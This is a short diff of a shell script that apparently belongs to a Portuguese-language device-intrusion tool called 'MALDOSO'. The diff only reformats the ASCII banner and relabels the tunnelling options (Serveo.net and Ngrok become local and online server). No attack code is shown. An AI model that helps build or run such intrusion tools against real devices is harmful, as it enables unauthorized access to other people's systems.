@@ -15,8 +15,10 @@ printf "${GREEN} | |\/| | / _ \ | |    | | | | | | \___ \| | | |${RESET}\n"
 printf "${GREEN} | |  | |/ ___ \| |___ | |_| | |_| |___) | |_| |${RESET}\n"
 printf "${GREEN} |_|  |_/_/   \_\_____|____/ \___/|____/ \___/ ${RESET}\n"
 
+
 printf "${GRAY}        [ MALDOSO • Invasão De Dispositivo ]${RESET}\n"
-printf "${GRAY}        v1.0 codado por Duzinn${RESET}\n\n"
+
+printf "${GRAY}              v1.0 codado por Duzinn${RESET}\n"
 }
 
 stop() {
@@ -139,8 +141,8 @@ start1() {
 rm -f sendlink
 
 printf "\n"
-printf "${GRAY}[01] Serveo.net${RESET}\n"
-printf "${GRAY}[02] Ngrok${RESET}\n"
+printf "${GRAY}[01] Servidor Local${RESET}\n"
+printf "${GRAY}[02] Servidor Online${RESET}\n"
 
 read -p "$(echo -e ${GRAY}'[+] Escolha uma opção: '${RESET})" option_server
 option_server="${option_server:-1}"
